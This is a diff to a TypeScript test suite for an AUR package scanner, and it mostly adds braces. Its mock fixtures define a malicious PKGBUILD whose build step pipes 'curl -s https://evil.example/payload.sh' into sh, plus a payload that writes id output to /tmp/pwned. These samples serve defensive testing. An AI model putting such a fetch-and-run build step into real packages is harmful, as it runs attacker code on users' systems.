@@ -15,7 +15,7 @@ const pinoStub = {
 const PKGBUILD = [
   'pkgname=evilpkg',
   'source=("https://evil.example/payload.sh" "helper.install")',
-  'sha256sums=(' + 'a'.repeat(64) + ' SKIP)',
+  `sha256sums=(${'a'.repeat(64)} SKIP)`,
   'build() {',
   '  curl -s https://evil.example/payload.sh | sh',
   '}',
@@ -64,7 +64,7 @@ function aurFetchMock(): ReturnType<typeof vi.fn> {
       );
     }
     if (url.endsWith('/PKGBUILD?h=evilpkg')) return textResponse(PKGBUILD);
-    if (url.includes('/cgit/aur.git/tree/sub/'))
+    if (url.includes('/cgit/aur.git/tree/sub/')) {
       return textResponse(
         [
           '<html><body>',
@@ -72,7 +72,8 @@ function aurFetchMock(): ReturnType<typeof vi.fn> {
           '</body></html>',
         ].join('\n'),
       );
-    if (url.includes('/cgit/aur.git/tree/'))
+    }
+    if (url.includes('/cgit/aur.git/tree/')) {
       return textResponse(
         [
           '<html><body>',
@@ -86,6 +87,7 @@ function aurFetchMock(): ReturnType<typeof vi.fn> {
           '</body></html>',
         ].join('\n'),
       );
+    }
     if (url.includes('helper.install')) return textResponse(HELPER_INSTALL);
     if (url.includes('payload.sh')) return textResponse('#!/bin/sh\nid > /tmp/pwned\n');
     if (url.includes('.SRCINFO')) return textResponse('pkgbase = evilpkg\npkgname = evilpkg\n');
@@ -190,14 +192,16 @@ describe('AurScanService', () => {
     vi.stubGlobal(
       'fetch',
       vi.fn(async (url: string) => {
-        if (url.includes('rpc/v5/info'))
+        if (url.includes('rpc/v5/info')) {
           return new Response(
             JSON.stringify({ results: [{ Name: 'metapkg', PackageBase: 'metapkg', FirstSubmitted: NOW_SECONDS }] }),
             { headers: { 'content-type': 'application/json' } },
           );
-        if (url.includes('by=maintainer'))
+        }
+        if (url.includes('by=maintainer')) {
           return new Response(JSON.stringify({ results: [] }), { headers: { 'content-type': 'application/json' } });
-        if (url.includes('/cgit/aur.git/tree/'))
+        }
+        if (url.includes('/cgit/aur.git/tree/')) {
           return textResponse(
             [
               '<html><body>',
@@ -208,6 +212,7 @@ describe('AurScanService', () => {
               '</body></html>',
             ].join('\n'),
           );
+        }
         if (url.endsWith('/PKGBUILD?h=metapkg')) return textResponse('pkgname=metapkg\n');
         if (url.includes('data.txt')) return textResponse('hello\n');
         if (url.includes('.SRCINFO')) return textResponse('pkgbase = metapkg\n');
@@ -408,7 +413,9 @@ describe('AurScanService', () => {
     await new Promise<void>((resolve) => {
       service.streamScan('evilpkg').subscribe({
         next: (message) => {
-          if (message.data && typeof message.data !== 'string') chunks.push(message.data.complete);
+          if (message.data && typeof message.data !== 'string') {
+            chunks.push(message.data.complete);
+          }
         },
         complete: () => resolve(),
       });
@@ -435,11 +442,13 @@ describe('AurScanService', () => {
             { headers: { 'content-type': 'application/json' } },
           );
         }
-        if (url.includes('by=maintainer'))
+        if (url.includes('by=maintainer')) {
           return new Response(JSON.stringify({ results: [] }), { headers: { 'content-type': 'application/json' } });
+        }
         if (url.endsWith('/PKGBUILD?h=oldpkg')) return textResponse('pkgname=oldpkg\ndepends=(olddep)\n');
-        if (url.includes('/cgit/aur.git/tree/'))
+        if (url.includes('/cgit/aur.git/tree/')) {
           return textResponse("<html><body><a href='/cgit/aur.git/tree/PKGBUILD?h=oldpkg'>PKGBUILD</a></body></html>");
+        }
         return new Response('not found', { status: 404 });
       }),
     );
